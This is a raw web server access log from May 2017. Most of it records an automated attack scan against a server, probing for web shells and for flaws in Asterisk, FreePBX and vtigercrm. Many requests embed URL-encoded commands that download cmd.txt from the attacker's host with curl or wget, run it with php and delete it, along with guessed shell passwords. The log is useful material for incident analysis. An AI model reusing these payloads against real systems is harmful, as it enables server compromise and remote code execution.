116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET / HTTP/1.1" 200 8624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.css HTTP/1.1" 200 11136 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.js HTTP/1.1" 200 19677 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /firebase-logo.png HTTP/1.1" 200 3542 "http://45.76.177.252:8889/main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /favicon.ico HTTP/1.1" 200 8624 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:54:07 +0000] "GET /silhouette.jpg HTTP/1.1" 200 4536 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
51.15.12.13 - - [26/May/2017:05:01:42 +0000] "POST /_asterisk/V-E-M.php?268e31510577740=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:43 +0000] "POST /x1.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:43 +0000] "POST /recordings/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:44 +0000] "POST /panel/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:45 +0000] "POST /webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:45 +0000] "POST /panel/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:46 +0000] "POST /panel/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:46 +0000] "POST /panel/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:47 +0000] "POST /panel/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:48 +0000] "POST /panel/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:48 +0000] "POST /panel/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:49 +0000] "POST /recordings/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:49 +0000] "POST /recordings/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:50 +0000] "POST /recordings/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:50 +0000] "POST /recordings/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:51 +0000] "POST /recordings/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:51 +0000] "POST /recordings/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:52 +0000] "POST /main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:52 +0000] "POST /main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:53 +0000] "POST /vtigercrm/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:53 +0000] "POST /vtigercrm/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:54 +0000] "POST /config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:54 +0000] "POST /recordings/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:55 +0000] "POST /panel/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:56 +0000] "POST /vtigercrm/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:56 +0000] "POST /admin/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:57 +0000] "POST /0x4148.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:58 +0000] "POST /recordings/misc/?cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:58 +0000] "POST /graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:59 +0000] "POST /recordings/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:02:00 +0000] "POST /vtigercrm/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:02:00 +0000] "POST /vtigercrm/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:02:01 +0000] "POST /recordings/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:02:02 +0000] "POST /phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
91.197.235.10 - - [26/May/2017:15:06:17 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=eltons" 400 173 "-" "-"
118.123.12.177 - - [26/May/2017:21:25:23 +0000] "GET http://50.117.47.15:28712/?rands=_123961161850568632524808 HTTP/1.1" 200 8859 "-" "-"
118.123.12.177 - - [26/May/2017:21:25:24 +0000] "GET http://123.249.29.201:43210/?rands=_12144393992306099969780 HTTP/1.1" 200 8859 "-" "-"
51.15.12.13 - - [27/May/2017:03:27:53 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x7F\xDBik\x9Ee[\xEA\xF3\xAB\xA8\x06\xAA\x83\x8D\xF3\xFB\x9E3\xD7(\xB3\x81\xA5\xAC%\x9Dz\xCC\xC8\xF3\xA7\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:03:27:54 +0000] "GET /a2billing/admin/Public/index.php HTTP/1.1" 404 8859 "-" "-"
163.172.99.10 - - [27/May/2017:05:01:44 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xE7\xC3\xE1\xD6\xF5\xC2\x1A\x04\xB8\x93\xB1\xD8}\xFFk\xCE\x84\xCF\xEE\xE7P((\xE5\x5CF_^\x1A\x11~j\x00\x006\xC0,\xC0" 400 173 "-" "-"
163.172.73.217 - - [27/May/2017:13:10:38 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03Y)z\xCDB\xE0\xBD\xF6\xFFZ\x14\x0C^\x1C\xF3\xB0\xA2\x8FJ;j\xFB\xD8\xE9FXJm\x19L\xEB@\x00\x00*\xC0+\xC0/\x00\x9E\xC0" 400 173 "-" "-"
163.172.73.217 - - [27/May/2017:13:10:41 +0000] "GET // HTTP/1.1" 200 8859 "-" "libwww-perl/6.24"
51.15.12.13 - - [27/May/2017:20:35:36 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x8Cj\xF9\x83D\xC5p\xF3k\x89<\x01:\xB3\xFA+\x97p\xD1\x1BX\x82\x8F\xF8)$\xF9p\xE4\xCD\xF0\xD4\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:36 +0000] "GET /recordings/index.php HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:37 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xAFJ\x19'\xFB\x81\xCB\x7F\x7FRn\xDC\xE0\x9Dk=\x13\xAB\x87\x06@\x07\xD84\x88\xF9)\x0Fg\xAC\xC3\xBB\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:38 +0000] "POST /admin/ajax.php?module=music HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [27/May/2017:20:35:39 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xE0\x89\xAD\x8E\xC6\x19QJn\x8A\x85\xCB\xECEy\xBE\x06\xCE\xBA\xA9\xD5\x00j\xCE\xE9\xB4\x03\x81Y\x97\x1D\xBB\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:39 +0000] "POST /admin/ajax.php?module=blacklist HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [27/May/2017:20:35:40 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x9D\xDD\x88\xDB\xD6\xBB@|}\x16W" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:41 +0000] "POST /admin/ajax.php?module=recordings HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [27/May/2017:20:35:42 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03u\xDB\x91\x90K\xDD\xD5\xA0v\xE7dfd\x82\x94\xAA\x1C\xB2^\x16/\xAC\x990+\x06\x00\xA7\x18\x05\xA5x\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:42 +0000] "GET /admin/ajax.php HTTP/1.1" 404 8859 "/admin/index.php" "-"
51.15.12.13 - - [27/May/2017:20:35:43 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03t[\x1A\x95Q3\x5C\x90\x88\x1C\xDE\xCB\xC3\xF4\xD1\x02\x88\xE3\x81\xAC\xF94P\xF0\x81HA\xA3|2\xEAD\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:44 +0000] "GET /admin/config.php?display=OpenVAS&handler=api&file=OpenVAS&module=OpenVAS&function=system&args=id HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:45 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xFCM\xA7q\x19?\xD1\xDD\x0C\xD8\x862h\xE5\x83]\x05\x03\xAA\x8B\x072*\x98\xE3\xCE\xD8\x9D\xFA\xCD}\x02\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:45 +0000] "GET /admin/modules/backup/page.backup.php HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:47 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03,[\xFE=\xCB\xE3P\xAA\xC6\xA1\xEB\x80\xC16\xA7\x98\x83\xB5\xC6\x9E\xEB\xD1\xEEg\xBDpe\xA40 W\x18\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:47 +0000] "POST /vtigercrm/phprint.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/vtigercrm/phprint.php" "-"
51.15.12.13 - - [27/May/2017:20:35:48 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x9E\xB5aa\xE5\xB1QM\xCEC\xF4\x96\xBE:\xDB6b\xBB\x8E&\x9D\x0F\xF0<y\xAF\x05\xED *\xD8P\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [27/May/2017:20:35:48 +0000] "POST / HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:49 +0000] "POST /admin/modules/admindashboard/phpsysinfo/common_admin_functions.php?c=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:50 +0000] "POST /recordings/jeep.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:50 +0000] "POST /admin/bootstrap.inc.php?mgp=danc3Uf%40t HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:51 +0000] "POST /recordings/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:52 +0000] "POST /recordings/emad-shell.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:52 +0000] "POST /recordings/emad.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:53 +0000] "POST /recordings/cmd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:54 +0000] "POST /recordings/mcd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:55 +0000] "POST /recordings/dmc.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:55 +0000] "POST /recordings/cmd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:56 +0000] "POST /recordings/mcd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:57 +0000] "POST /recordings/dmc.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:57 +0000] "POST /recordings/cmd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:58 +0000] "POST /recordings/mcd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:59 +0000] "POST /recordings/dmc.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:35:59 +0000] "POST /recordings/config.amportal.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:00 +0000] "POST /recordings/scan.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:01 +0000] "POST /vtigercrm/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:01 +0000] "POST /vtigercrm/Hima.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:02 +0000] "POST /vtigercrm/xXx-mat.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:03 +0000] "POST /vtigercrm/Himaa.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:03 +0000] "POST /recordings/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:04 +0000] "POST /vtigercrm/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:05 +0000] "POST /vtigercrm/zizo.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:05 +0000] "POST /vtigercrm/ops.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:06 +0000] "POST /vtigercrm/xXx-ELMAYET-xXx.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:07 +0000] "POST /zz.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:07 +0000] "POST /vtigercrm/z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:08 +0000] "POST /z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:09 +0000] "POST /recordings/lol.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:09 +0000] "POST /recordings/badr2.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:10 +0000] "POST /recordings/Go.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:11 +0000] "POST /recordings/info.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:11 +0000] "POST /recordings/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:12 +0000] "POST /vtigercrm/moaz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:13 +0000] "POST /vtigercrm/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:13 +0000] "POST /11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:14 +0000] "POST /recordings/a8a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:15 +0000] "POST /wav.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:15 +0000] "POST /_asterisk/V-E-M.php?268e31510577740=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:16 +0000] "POST /x1.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:17 +0000] "POST /recordings/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:17 +0000] "POST /panel/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:18 +0000] "POST /webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:19 +0000] "POST /panel/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:19 +0000] "POST /panel/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:20 +0000] "POST /panel/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:20 +0000] "POST /panel/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:21 +0000] "POST /panel/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:21 +0000] "POST /panel/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:22 +0000] "POST /recordings/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:22 +0000] "POST /recordings/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:23 +0000] "POST /recordings/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:23 +0000] "POST /recordings/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:24 +0000] "POST /recordings/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:24 +0000] "POST /recordings/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:25 +0000] "POST /main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:25 +0000] "POST /main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:26 +0000] "POST /vtigercrm/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:26 +0000] "POST /vtigercrm/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:27 +0000] "POST /config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:27 +0000] "POST /recordings/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [27/May/2017:20:36:28 +0000] "POST /panel/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
